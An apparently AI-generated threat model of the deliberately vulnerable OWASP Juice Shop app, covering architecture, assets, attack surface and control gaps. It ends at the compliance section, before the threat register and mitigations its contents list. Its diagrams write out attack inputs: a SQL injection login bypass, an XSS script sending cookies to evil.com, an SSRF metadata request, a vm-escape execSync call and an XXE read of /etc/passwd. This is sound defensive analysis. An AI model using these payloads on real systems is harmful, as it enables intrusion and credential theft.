# Threat Model — OWASP Juice Shop

| Field | Value |
|-------|-------|
| Generated | 2026-04-09T10:13:00Z |
| Analysis Duration | 29 min 56 s |
| Analyst | appsec-threat-analyst (Claude) |
| Model | claude-sonnet-4-6 |
| Agent Models | all agents: claude-sonnet-4-6 |
| Input Tokens | unavailable |
| Output Tokens | unavailable |
| Cache Read Tokens | unavailable |
| Cache Write Tokens | unavailable |
| Estimated Cost | unavailable |
| Context Sources | None |

> ℹ Token and cost data are not accessible at agent runtime. Check the Anthropic Console for usage details of this session.

---

## Table of Contents

- [Management Summary](#management-summary)
- [1. System Overview](#1-system-overview)
- [2. Architecture Diagrams](#2-architecture-diagrams)
  - [2.1 System Context](#21-system-context)
  - [2.2 Containers](#22-containers)
  - [2.3 Technology Architecture](#23-technology-architecture)
  - [2.4 Security Architecture Assessment](#24-security-architecture-assessment)
- [3. Security-Relevant Use Cases](#3-security-relevant-use-cases)
- [4. Assets](#4-assets)
- [5. Attack Surface](#5-attack-surface)
- [6. Trust Boundaries](#6-trust-boundaries)
- [7. Identified Security Controls](#7-identified-security-controls)
- [7b. Requirements Compliance](#7b-requirements-compliance)
- [8. Threat Register](#8-threat-register)
- [9. Critical Findings](#9-critical-findings)
- [10. Mitigation Register](#10-mitigation-register)
- [11. Out of Scope](#11-out-of-scope)

---

## Management Summary

This threat model identified **28 threats** across 5 components of OWASP Juice Shop v19.2.1, with the following risk distribution:

| Risk Level | Count | Key Areas |
|------------|-------|-----------|
| 🔴 Critical | 6 | Hardcoded JWT private key, SQL injection (login+search), MD5 passwords, RCE via vm sandbox, XXE |
| 🟠 High | 10 | XSS (bypassSecurityTrustHtml), SSRF, IDOR (basket), unauthenticated product update, NoSQL injection, open CORS |
| 🟡 Medium | 8 | Mass assignment, brute force (no login rate limit), path traversal, open redirect, exposed metrics, CSRF |
| 🟢 Low | 4 | Cookie secret exposure, token in URL, logfile disclosure, weak FTP directory listing |

### Key Strengths

- Container runs as non-root (UID 65532) on a distroless base image ([Dockerfile:18](vscode://file/home/mrohr/juice-shop/Dockerfile:18)) — limits post-exploitation impact.
- SBOM generation (`cyclonedx-npm`) integrated into the Docker build step — enables supply-chain visibility.
- GitHub Actions SHA-pinned in ci.yml — prevents mutable-tag action hijacking in the main pipeline.
- OWASP ZAP DAST scan wired into CI ([.github/workflows/zap_scan.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/zap_scan.yml)) and CodeQL SAST enabled.

### Requirements Compliance

**Baseline:** [OWASP Security Requirements](http://127.0.0.1:8000/appsec-requirements-example.yaml)
**Result:** 25 requirements checked — ✅ 4 PASS · ❌ 13 FAIL · ⚠️ 8 PARTIAL

Top violated requirements:
- **[IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — SQL Injection Prevention:** Login and search queries use direct string interpolation instead of parameterized statements.
- **[DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secret Management:** RSA private key, HMAC secret, and cookie secret are all hardcoded in source code.
- **[WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — XSS Prevention:** Angular's `bypassSecurityTrustHtml` called in 6+ components, bypassing framework XSS protection.

→ *Full compliance details in [Section 7b — Requirements Compliance](#7b-requirements-compliance).*

### Top Findings

- **[T-001 — Hardcoded RSA Private Key Enables JWT Forgery](#t-001):** The private key used to sign all JWT tokens is committed in plaintext to the repository, allowing any attacker with repo read access to forge admin-level tokens.
- **[T-002 — SQL Injection in Login Query Enables Authentication Bypass](#t-002):** Direct string interpolation in the login SQL query allows unauthenticated attackers to bypass authentication and access any account including admin.
- **[T-003 — SQL Injection in Search Enables Full Database Extraction](#t-003):** The product search endpoint builds queries via string concatenation, enabling UNION-based extraction of all user credentials and PII.
- **[T-004 — MD5 Password Hashing — Trivial Offline Cracking](#t-004):** All user passwords are stored as unsalted MD5 hashes, enabling instant cracking via rainbow tables after any database compromise.
- **[T-005 — RCE via vm.runInContext in B2B Order Endpoint](#t-005):** The B2B order endpoint evaluates user-supplied JavaScript inside a Node.js VM sandbox, which is insufficient isolation and allows sandbox escape.

### Recommended Priority Actions

1. **[M-001 — Replace hardcoded JWT key with secrets manager](#m-001)** (Effort: Medium · addresses 3 threats) — Move the RSA private key out of source code and into a secrets manager or environment-injected secret.
2. **[M-002 — Parameterize all SQL queries](#m-002)** (Effort: Low · addresses 2 threats) — Replace all raw Sequelize string-template queries with parameterized `?` placeholders.
3. **[M-003 — Replace MD5 with bcrypt/argon2 for password hashing](#m-003)** (Effort: Low · addresses 1 threat) — Swap `crypto.createHash('md5')` for `bcrypt` or `argon2` in the User model setter.
4. **[M-004 — Remove vm.runInContext evaluation of user input](#m-004)** (Effort: Medium · addresses 1 threat) — Remove the B2B order expression evaluator or restrict input to a strict allowlist parser.
5. **[M-005 — Disable XXE in libxmljs2 parser](#m-005)** (Effort: Low · addresses 1 threat) — Pass `{ noent: false, noblanks: true }` options to disable external entity resolution.

### Overall Security Rating

🔴 **Critical gaps** — The application contains multiple confirmed Critical-severity vulnerabilities (hardcoded cryptographic keys, SQL injection in authentication, MD5 password storage, RCE via eval) that represent systemic failures in security fundamentals, not isolated bugs.

→ *Full details in [Threat Register](#8-threat-register) and [Mitigation Register](#10-mitigation-register).*

---

## 1. System Overview

OWASP Juice Shop v19.2.1 is a deliberately insecure web application maintained by the OWASP Foundation. It simulates a modern e-commerce platform — complete with user accounts, product catalog, shopping basket, order processing, payment cards, reviews, a chatbot, and crypto wallet functionality — while intentionally embedding over 100 security vulnerabilities for training and CTF purposes.

**Deployment context:** Single Node.js container (distroless, non-root UID 65532) exposing port 3000. No reverse proxy or TLS termination is bundled; deployments are expected to front the container with a load balancer. SQLite provides persistent storage inside the container; NeDB provides an embedded MongoDB-compatible store for reviews and orders. No external services are required at runtime.

**Users:** Anonymous visitors (product browsing), registered customers (checkout, reviews, data export), administrators (user management, order management), and deluxe-tier members.

**Complexity tier: Moderate** — Two distinct runtime layers (Angular SPA + Express API), two databases (SQLite + NeDB), dual authentication paths (local JWT + OAuth2), and an auxiliary chatbot. Not complex enough to warrant a full Component-level C4 diagram, but enough to merit a Container diagram.

**Compliance scope:** No formal compliance scope declared. OWASP Top 10 2021 applies as the baseline. Requirements checked against the OWASP Security Requirements baseline fetched from the configured endpoint.

**Context sources used:** None — no external context endpoint configured, no `docs/business-context.md`, no known-threats file. Context was derived entirely from repository code.

**Overall security impression:** This codebase is a textbook compendium of the OWASP Top 10 and more. Every critical category is represented: SQL injection (A03), broken authentication (A07), XSS (A03), IDOR (A01), SSRF (A10), hardcoded secrets (A02), insecure deserialization via XXE (A08), and RCE via eval (A03). The intent is educational, but any real deployment without remediation would be immediately compromised.

---

## 2. Architecture Diagrams

The following diagrams model the system architecture at two abstraction levels using C4 conventions. Security-relevant nodes are highlighted with the `:::risk` classifier where a Medium or higher threat has been identified.

### 2.1 System Context

```mermaid
graph TD
    subgraph INTERNET["🌐 Public Internet · untrusted"]
        User["Shopper\nWeb Browser\nAnonymous or authenticated"]:::person
        Admin["Administrator\nWeb Browser\nAuthenticated + privileged"]:::person
        Attacker["Threat Actor\nWeb Browser or CLI\nUnauthenticated"]:::person
    end

    subgraph APP["🔒 Application Tier"]
        JuiceShop["OWASP Juice Shop\nNode.js 24 + Angular 17\nv19.2.1 · Port 3000"]:::risk
    end

    subgraph DEPS["🔶 External / Third-Party"]
        OAuth["OAuth2 Provider\nGoogle OAuth\nExternal IdP"]:::external
        Web3["Ethereum Network\nWeb3/ethers.js\nExternal chain"]:::external
        ChatBot["juicy-chat-bot\nnpm package\nEmbedded ML"]:::external
    end

    User -->|"HTTPS · GET/POST · Port 3000"| JuiceShop
    Admin -->|"HTTPS · GET/POST · Port 3000"| JuiceShop
    Attacker -->|"HTTP · Malicious payloads · Port 3000"| JuiceShop
    JuiceShop -->|"HTTPS · OAuth2 auth code flow"| OAuth
    JuiceShop -->|"HTTPS · JSON-RPC · Port 443"| Web3
    JuiceShop -.->|"npm install · supply chain"| ChatBot

%% Trust Boundary Key:
%% INTERNET→APP: No TLS termination in app; relies on upstream load balancer
%% APP→OAuth: OAuth2 authorization code flow; no PKCE enforced
%% APP→Web3: Public RPC endpoint; no authentication
```

### 2.2 Containers

```mermaid
graph TD
    subgraph INTERNET["🌐 Public Internet · untrusted"]
        Browser["User Browser\nAngular 17 SPA\nJavaScript client"]:::person
    end

    subgraph CONTAINER["🔒 Application Container · UID 65532 · Port 3000"]
        SPA["Angular SPA\nTypeScript + Angular Material\nServed as static files"]:::system
        API["Express REST API\nNode.js 24 + TypeScript\nRoutes: /api/* /rest/* /b2b/*"]:::risk
        Auth["Auth Module\nlib/insecurity.ts\nJWT RS256 · hardcoded key"]:::risk
        FileStore["File Store\nftp/ uploads/ logs/\nDisk · writeable"]:::risk
    end

    subgraph DB_TIER["🔐 Data Tier · restricted"]
        SQLite["SQLite DB\nSequelize ORM\nUsers Products Orders"]:::risk
        NeDB["NeDB Store\nnedb-promises\nReviews Orders MongoDB-style"]:::risk
    end

    subgraph EXT["🔶 External Services"]
        OAuthExt["Google OAuth2\nExternal IdP\nHTTPS"]:::external
    end

    Browser -->|"HTTPS · SPA bundle"| SPA
    Browser -->|"HTTPS · REST calls · JSON"| API
    SPA -->|"HTTP · Angular HTTP client · JSON"| API
    API -->|"Module call · JWT sign/verify"| Auth
    API -->|"Sequelize ORM · SQL"| SQLite
    API -->|"nedb-promises · $where queries"| NeDB
    API -->|"fs.writeFile · disk write"| FileStore
    API -->|"HTTPS · OAuth2 redirect"| OAuthExt

%% Trust Boundary Key:
%% INTERNET→CONTAINER: HTTP only (TLS at load balancer); no WAF
%% CONTAINER→DB_TIER: Local file I/O (SQLite) and in-process (NeDB); no network boundary
%% CONTAINER→EXT: HTTPS OAuth2; no state/PKCE validation confirmed
```

### 2.3 Technology Architecture

```mermaid
graph TB
    subgraph CLIENT["Client Layer"]
        NG["Angular 17+\nTypeScript SPA\nAngular Material UI"]
    end

    subgraph SERVER["Server Layer · Node.js 24"]
        EX["Express 4.x\nMiddleware stack\nHelmet · CORS · Morgan"]
        RT["Route Handlers\n61 TypeScript modules\nroutes/*.ts"]
        SEC["lib/insecurity.ts\nexpress-jwt · jsonwebtoken\nRS256 hardcoded key"]
    end

    subgraph DATA["Data Layer"]
        ORM["Sequelize 6\nSQLite3\nmodels/*.ts"]
        MDB["NeDB (nedb-promises)\nMongoDB-like API\ndata/mongodb.ts"]
    end

    subgraph INFRA["Infrastructure"]
        DOCK["Docker Container\ndistroless/nodejs24\nUID 65532"]
        CI["GitHub Actions\nCI/CD · CodeQL · ZAP\n.github/workflows/"]
    end

    NG -->|"HTTP/REST · JSON · Port 3000"| EX
    EX -->|"Express router"| RT
    RT -->|"Module import"| SEC
    RT -->|"Sequelize queries"| ORM
    RT -->|"nedb-promises find/update"| MDB
    DOCK -->|"hosts"| EX
    CI -->|"builds and tests"| DOCK
```

### 2.4 Security Architecture Assessment

#### Architecture Patterns

| Pattern | Present | Notes |
|---------|---------|-------|
| API Gateway | ❌ No | Express router only; no dedicated gateway or WAF |
| Backend-for-Frontend (BFF) | ❌ No | SPA calls API directly |
| Defense-in-depth | ❌ No | Single layer; no WAF, no IDS, no input schema validation |
| Separation of concerns | ⚠️ Partial | Auth logic in lib/insecurity.ts but deliberately weak |
| Least privilege | ⚠️ Partial | Container runs non-root; but API has no per-resource ownership enforcement |
| Secrets management | ❌ No | All secrets hardcoded in source |
| Network segmentation | ❌ No | Single container, no internal network separation |
| Secure defaults | ❌ No | Wildcard CORS, no global CSP, no HSTS, XSS filter commented out |

#### Trust Model Evaluation

The application does not implement fail-closed behavior. Several routes accept unauthenticated requests that should require authentication (e.g., `PUT /api/Products/:id` has its `isAuthorized()` middleware commented out). The basket retrieval endpoint validates the JWT signature but does not verify basket ownership — it only tracks whether a challenge was solved. The login endpoint implicitly trusts that SQL query output means authentication success without additional checks. The design reflects implicit trust at every layer.

#### Authentication & Authorization Architecture

Authentication is centralized in `lib/insecurity.ts` using `express-jwt` middleware with an RSA public key for verification and a hardcoded RSA private key for signing. Token lifetime is 6 hours. Role claims are embedded in the JWT payload (`role: customer|admin|accounting|deluxe`). There is no token revocation mechanism — a stolen token remains valid until expiry. Authorization is applied inconsistently: some routes use `security.isAuthorized()`, some use `security.denyAll()`, and others have their middleware commented out for challenge purposes. The OAuth2 flow redirects to Google but no PKCE, nonce, or state validation is confirmed in the codebase.

#### Key Architectural Risks

| # | Structural Risk | Impact if Exploited | Linked Threats |
|---|-----------------|--------------------|-|
| 1 | RSA private key hardcoded in source code | Attacker forges admin JWT tokens → full account takeover | [T-001](#t-001) |
| 2 | No parameterized queries in critical paths | SQL injection → full DB extraction, auth bypass | [T-002](#t-002), [T-003](#t-003) |
| 3 | eval() / vm.runInContext with user input | Remote code execution on server | [T-005](#t-005) |
| 4 | bypassSecurityTrustHtml throughout Angular SPA | Stored and reflected XSS → session hijacking | [T-007](#t-007), [T-008](#t-008) |
| 5 | Wildcard CORS + missing CSP + no HSTS | Cross-origin attacks, MITM, data theft | [T-013](#t-013), [T-014](#t-014) |

#### Overall Architecture Security Rating

🔴 **Critical gaps** — The application's security architecture is intentionally broken in every major category. Cryptographic key management, injection prevention, output encoding, and access control all have confirmed Critical or High vulnerabilities. No architectural pattern (WAF, API gateway, secrets manager, input schema validation) that would provide defense-in-depth is present.

---

## 3. Security-Relevant Use Cases

These sequence diagrams document security-critical flows, showing both normal operation and the primary attack vectors that exploit each flow.

### 3.1 Authentication Flow (with SQL Injection Attack Path)

```mermaid
sequenceDiagram
    participant U as User Browser
    participant API as Express API
    participant DB as SQLite (Sequelize)

    U->>API: POST /rest/user/login {email, password}
    API->>DB: SELECT * FROM Users WHERE email='<email>' AND password='<md5>'
    note over DB: VULNERABLE: string interpolation — no parameterized query
    DB-->>API: User row or null
    alt Login success
        API-->>U: 200 {token: JWT_RS256, bid: basketId}
        note over U: Token stored in cookie + localStorage
    else SQL Injection attack
        U->>API: POST /rest/user/login {email: "' OR 1=1--", password: "x"}
        API->>DB: SELECT * FROM Users WHERE email='' OR 1=1--'...
        DB-->>API: First user row (admin)
        API-->>U: 200 {token: admin_JWT}
    else Invalid credentials
        API-->>U: 401 Invalid email or password
    end
```

### 3.2 JWT Forgery via Hardcoded Private Key

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant REPO as GitHub Repository
    participant API as Express API

    ATK->>REPO: GET lib/insecurity.ts (public repo)
    REPO-->>ATK: RSA private key (1024-bit hardcoded)
    note over ATK: jwt.sign({data:{role:'admin'}}, privateKey, {algorithm:'RS256'})
    ATK->>API: GET /rest/user/whoami  Authorization: Bearer <forged_token>
    API->>API: jwt.verify(token, publicKey) — passes (self-signed with stolen key)
    API-->>ATK: 200 {email: "admin@..."}
    ATK->>API: GET /api/Users  Authorization: Bearer <forged_token>
    API-->>ATK: 200 All user records including hashed passwords
```

### 3.3 XSS via bypassSecurityTrustHtml (Stored XSS)

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant API as Express API
    participant DB as NeDB Reviews
    participant Victim as Victim Browser

    ATK->>API: POST /api/Products/1/reviews {message: "<script>fetch('https://evil.com/?c='+document.cookie)</script>"}
    API->>DB: Insert review (no sanitization)
    DB-->>API: 201 Created
    Victim->>API: GET /api/Products/1/reviews
    API-->>Victim: 200 [{message: "<script>..."}]
    note over Victim: Angular calls sanitizer.bypassSecurityTrustHtml(review.message)
    note over Victim: [innerHTML] renders malicious script
    Victim->>ATK: Cookie data exfiltrated (XSS executed)
```

### 3.4 SSRF via Profile Image URL Upload

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant API as Express API
    participant INT as Internal Service

    ATK->>API: POST /profile/image/url {imageUrl: "http://169.254.169.254/latest/meta-data/"}
    API->>INT: fetch("http://169.254.169.254/latest/meta-data/")
    note over API: No URL allowlist validation
    INT-->>API: Cloud metadata response
    API-->>ATK: 302 redirect to /profile (response body available via error log)
```

### 3.5 B2B Order RCE via vm.runInContext

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant API as Express API (authenticated)

    ATK->>API: POST /b2b/v2/orders {orderLinesData: "process.mainModule.require('child_process').execSync('id')"}
    note over API: vm.runInContext('safeEval(orderLinesData)', sandbox)
    note over API: Node.js VM sandbox escape possible
    API->>API: Executes OS command
    API-->>ATK: 200 or error response with command output
```

### 3.6 Input Validation Flow (File Upload with XXE)

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant API as Express API

    ATK->>API: POST /file-upload multipart/form-data [malicious.xml]
    note over API: handleXmlUpload called
    API->>API: libxml.parseXml(data, {noent: true}) — external entities ENABLED
    note over API: XXE: DOCTYPE with SYSTEM "file:///etc/passwd"
    API-->>ATK: 410 response body includes /etc/passwd contents
```

---

## 4. Assets

The table below identifies all assets requiring protection, classified by sensitivity, with cross-references to the threats that target them.

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|---------------|
| User credentials (email + MD5 password) | Restricted | All user account credentials in SQLite Users table | [T-002](#t-002), [T-003](#t-003), [T-004](#t-004) |
| JWT RSA private key | Restricted | Signs all authentication tokens; compromise = full account takeover | [T-001](#t-001) |
| JWT tokens (active sessions) | Confidential | Bearer tokens valid for 6h, stored in cookies and localStorage | [T-007](#t-007), [T-008](#t-008), [T-009](#t-009) |
| Payment card data | Restricted | Credit/debit card numbers stored in Cards table | [T-003](#t-003), [T-011](#t-011) |
| User PII (email, address, profile image) | Confidential | Personal data in Users and Addresses tables | [T-003](#t-003), [T-010](#t-010) |
| Product catalog & pricing | Internal | Products table; unauthorized modification possible | [T-012](#t-012) |
| Order history | Confidential | Order data in NeDB; email-based access control | [T-010](#t-010) |
| Server-side log files | Internal | Access logs in logs/ directory; served via /support/logs endpoint | [T-020](#t-020) |
| HMAC secret (deluxe token) | Restricted | Hardcoded HMAC key used for deluxe membership tokens | [T-001](#t-001) |
| Encryption keys directory | Restricted | encryptionkeys/jwt.pub, premium.key served via unauthenticated HTTP | [T-021](#t-021) |
| SQLite database file | Restricted | Single file containing all user data, orders, products | [T-003](#t-003), [T-004](#t-004) |
| Application availability | Internal | Node.js process uptime; single-container deployment | [T-022](#t-022), [T-023](#t-023) |

---

## 5. Attack Surface

All identified entry points through which an attacker can interact with the system, including protocol, authentication requirements, and linked threats.

| Entry Point | Protocol/Method | Authentication | Notes | Linked Threats |
|-------------|----------------|---------------|-------|---------------|
| POST /rest/user/login | HTTP POST | None | SQL injection; no rate limit | [T-002](#t-002), [T-017](#t-017) |
| GET /rest/products/search | HTTP GET | None | SQL injection via `q` param | [T-003](#t-003) |
| POST /b2b/v2/orders | HTTP POST | JWT required | RCE via vm eval | [T-005](#t-005) |
| POST /file-upload | HTTP POST | None | XXE, path traversal via zip | [T-006](#t-006), [T-019](#t-019) |
| POST /profile/image/url | HTTP POST | JWT required (cookie) | SSRF — arbitrary URL fetch | [T-010](#t-010) |
| GET /rest/basket/:id | HTTP GET | JWT required | IDOR — no ownership check | [T-011](#t-011) |
| PUT /api/Products/:id | HTTP PUT | None (commented out) | Unauthenticated product modification | [T-012](#t-012) |
| POST /api/Users | HTTP POST | None | Mass assignment — role escalation | [T-015](#t-015) |
| GET /rest/user/change-password | HTTP GET | JWT required | Passwords in URL query string; no current-password enforcement | [T-016](#t-016) |
| GET /metrics | HTTP GET | None | Prometheus metrics — information disclosure | [T-021](#t-021) |
| GET /encryptionkeys/:file | HTTP GET | None | Serves RSA public key and premium.key | [T-021](#t-021) |
| GET /ftp/:file | HTTP GET | None | Directory listing + file download | [T-020](#t-020) |
| GET /support/logs/:file | HTTP GET | None (partially restricted) | Log file read; forward-slash check only | [T-020](#t-020) |
| GET /api/Users | HTTP GET | JWT required | Returns all user records to any authenticated user | [T-003](#t-003) |
| GET /rest/user/authentication-details | HTTP GET | JWT required | Exposes all active session tokens | [T-009](#t-009) |
| WebSocket (Socket.io) | WS | None (challenge notifications) | Challenge solve notifications; CORS: localhost:4200 only | [T-013](#t-013) |
| GET /api-docs | HTTP GET | None | Swagger UI — full API documentation exposed | [T-021](#t-021) |
| GET /oauth2/authorization | HTTP GET | None | OAuth2 entry; no PKCE; open redirect risk | [T-018](#t-018) |

---

## 6. Trust Boundaries

Trust boundaries mark transitions between different trust levels. Weaknesses at these boundaries are primary sources of security risk.

The overall trust model is fail-open: missing authentication middleware is the norm rather than the exception for intentional challenge routes, but several non-challenge routes also lack controls.

| # | Boundary | From | To | Enforcement Mechanism | Key Weakness | Linked Threats |
|---|----------|------|----|-----------------------|-------------|---------------|
| TB-1 | Internet → Application | Unauthenticated user | Express API | express-jwt middleware (selective) | Many routes unauthenticated; no WAF; no TLS termination | [T-002](#t-002), [T-003](#t-003), [T-006](#t-006) |
| TB-2 | Authenticated user → Admin functions | JWT customer role | Admin-only routes | isAdmin() / isAccounting() role checks in JWT payload | Role claim from JWT — if private key compromised, role is forged | [T-001](#t-001), [T-015](#t-015) |
| TB-3 | Application → Database | Express handlers | SQLite + NeDB | Sequelize ORM (partially) | Raw queries bypass ORM; no query parameterization | [T-002](#t-002), [T-003](#t-003), [T-024](#t-024) |
| TB-4 | Application → External Network | Server-side code | External URLs / OAuth | None for SSRF; OAuth2 redirect for auth | Server fetches arbitrary attacker-supplied URLs | [T-010](#t-010), [T-018](#t-018) |

TB-1 note: The `/ftp/`, `/api-docs`, `/metrics`, and `/encryptionkeys/` paths are all reachable without any authentication. These should be served on an internal-only interface or protected by network policy.

TB-2 note: The JWT role claim is the sole authorization signal. No server-side role table lookup occurs — the role embedded at token issuance is trusted for the token's 6-hour lifetime with no revocation capability.

TB-3 note: NeDB uses `$where` with JavaScript function strings evaluated against documents, enabling NoSQL injection via `this.product == <user_input>` pattern in `showProductReviews.ts:36`.

---

## 7. Identified Security Controls

The most critical security gaps are: (1) all cryptographic secrets are hardcoded in source code; (2) no parameterized SQL queries in the authentication and search paths; (3) Angular's XSS protection is deliberately bypassed in 6+ components; (4) no global CSP or HSTS; (5) no rate limiting on the login endpoint. These five gaps directly enable the top 6 Critical threats.

Legend: ✅ Adequate | ⚠️ Partial | 🔶 Weak | ❌ Missing

| Domain | Control | Implementation | Effectiveness | Linked Threats |
|--------|---------|---------------|--------------|---------------|
| IAM | JWT Authentication | [lib/insecurity.ts:70](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:70) — express-jwt + RS256 | 🔶 Weak — private key hardcoded | [T-001](#t-001) |
| IAM | 2FA (TOTP) | [routes/2fa.ts](vscode://file/home/mrohr/juice-shop/routes/2fa.ts) — TOTP second factor | ⚠️ Partial — optional, not enforced | [T-017](#t-017) |
| IAM | OAuth2 Login | [server.ts](vscode://file/home/mrohr/juice-shop/server.ts) — /oauth2/authorization | 🔶 Weak — no PKCE, no state validation | [T-018](#t-018) |
| Authorization | RBAC middleware | [lib/insecurity.ts:85+](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:85) — isAdmin/isAccounting/isDeluxe | ⚠️ Partial — several routes have middleware commented out | [T-012](#t-012), [T-015](#t-015) |
| Authorization | Resource ownership | [routes/basket.ts:22](vscode://file/home/mrohr/juice-shop/routes/basket.ts:22) | ❌ Missing — IDOR not prevented | [T-011](#t-011) |
| Data Protection | Password hashing | [models/user.ts:70](vscode://file/home/mrohr/juice-shop/models/user.ts:70) — MD5 (no salt) | ❌ Missing — cryptographically broken | [T-004](#t-004) |
| Data Protection | Sensitive data in URLs | [routes/changePassword.ts:13](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts:13) — GET with query params | ❌ Missing — passwords in URL | [T-016](#t-016) |
| Secret Management | Cryptographic keys | [lib/insecurity.ts:24](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24) | ❌ Missing — hardcoded RSA key | [T-001](#t-001) |
| Secret Management | HMAC secret | [lib/insecurity.ts:46](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:46) | ❌ Missing — hardcoded | [T-001](#t-001) |
| Secret Management | Cookie secret | [server.ts:289](vscode://file/home/mrohr/juice-shop/server.ts:289) | ❌ Missing — hardcoded 'kekse' | [T-001](#t-001) |
| Frontend Security | Angular XSS protection | [frontend/src/app/search-result/search-result.component.ts:170](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:170) | ❌ Missing — bypassSecurityTrustHtml | [T-007](#t-007), [T-008](#t-008) |
| Frontend Security | Content-Security-Policy | [routes/userProfile.ts:95](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:95) — profile page only | 🔶 Weak — not global; unsafe-eval present | [T-007](#t-007) |
| Frontend Security | CORS | [server.ts:181](vscode://file/home/mrohr/juice-shop/server.ts:181) — `app.use(cors())` | ❌ Missing — wildcard origin | [T-013](#t-013) |
| Output Encoding | SQL parameterization | [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23), [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) | ❌ Missing — string interpolation | [T-002](#t-002), [T-003](#t-003) |
| Output Encoding | HTML sanitization | [lib/insecurity.ts:56](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:56) — sanitize-html (partial) | 🔶 Weak — bypassed in frontend | [T-007](#t-007) |
| Audit & Logging | Access logging | [server.ts:338](vscode://file/home/mrohr/juice-shop/server.ts:338) — Morgan combined format + file rotation | ⚠️ Partial — no SIEM, no security events | [T-025](#t-025) |
| Audit & Logging | Security event logging | [lib/logger.ts](vscode://file/home/mrohr/juice-shop/lib/logger.ts) — Winston console only | ❌ Missing — no auth failure / violation events | [T-025](#t-025) |
| Infrastructure | Security headers | [server.ts:185-187](vscode://file/home/mrohr/juice-shop/server.ts:185) — helmet.noSniff, frameguard | ⚠️ Partial — no HSTS, no global CSP | [T-014](#t-014) |
| Infrastructure | Container hardening | [Dockerfile:18](vscode://file/home/mrohr/juice-shop/Dockerfile:18) — distroless, UID 65532 | ✅ Adequate — non-root, minimal image. Distroless base reduces attack surface significantly. |  — |
| Infrastructure | Rate limiting | [server.ts:343+](vscode://file/home/mrohr/juice-shop/server.ts:343) — express-rate-limit on reset-password | 🔶 Weak — not applied to /rest/user/login | [T-017](#t-017) |
| Dependency & Supply Chain | CI/CD action pinning | [.github/workflows/ci.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/ci.yml) — SHA pinned | ⚠️ Partial — codeql-analysis.yml uses @v3 tags | [T-026](#t-026) |
| Dependency & Supply Chain | SBOM generation | [Dockerfile](vscode://file/home/mrohr/juice-shop/Dockerfile) — cyclonedx-npm in build | ✅ Adequate — CycloneDX SBOM generated on every Docker build. |  — |
| Dependency & Supply Chain | CVE scanning in CI | [.github/workflows/ci.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/ci.yml) — CodeQL only | 🔶 Weak — no npm audit or SCA blocking build | [T-026](#t-026) |
| Dependency & Supply Chain | Lockfile integrity | package-lock.json not confirmed; `npm install` used in CI | ❌ Missing — no lockfile enforcement | [T-026](#t-026) |
| Security Testing | DAST | [.github/workflows/zap_scan.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/zap_scan.yml) — ZAP automated scan | ✅ Adequate — OWASP ZAP DAST integrated in CI pipeline. |  — |
| Security Testing | SAST | [.github/workflows/codeql-analysis.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml) — CodeQL | ✅ Adequate — CodeQL enabled on PRs. Partially unpinned actions. |  — |

---

## 7b. Requirements Compliance

This section summarizes the compliance status of each requirement from the [OWASP Security Requirements](http://127.0.0.1:8000/appsec-requirements-example.yaml) baseline. Requirements marked ❌ FAIL have generated threat entries in the [Threat Register](#8-threat-register).

| Requirement | Title | Status | Evidence | Linked Threats |
|-------------|-------|--------|----------|----------------|
| [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | SQL parameterized queries | ❌ FAIL | String interpolation in routes/login.ts:34 and routes/search.ts:23 | [T-002](#t-002), [T-003](#t-003) |
| [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | Secrets in secret manager | ❌ FAIL | RSA key, HMAC secret, cookie secret all hardcoded in lib/insecurity.ts:24,46 and server.ts:289 | [T-001](#t-001) |
| [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | XSS prevention | ❌ FAIL | bypassSecurityTrustHtml in 6+ Angular components | [T-007](#t-007), [T-008](#t-008) |
| [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) | Secure password storage | ❌ FAIL | MD5 without salt in models/user.ts:70 | [T-004](#t-004) |
| [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | XXE prevention | ❌ FAIL | libxmljs2 called with `noent: true` in routes/fileUpload.ts:75 | [T-006](#t-006) |
| [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) | CORS allowlist | ❌ FAIL | `app.use(cors())` wildcard in server.ts:182 | [T-013](#t-013) |
| [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | IDOR prevention | ❌ FAIL | Basket access without ownership check in routes/basket.ts:22 | [T-011](#t-011) |
| [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | Management endpoints internal-only | ❌ FAIL | /metrics, /api-docs, /encryptionkeys/ unauthenticated and public | [T-021](#t-021) |
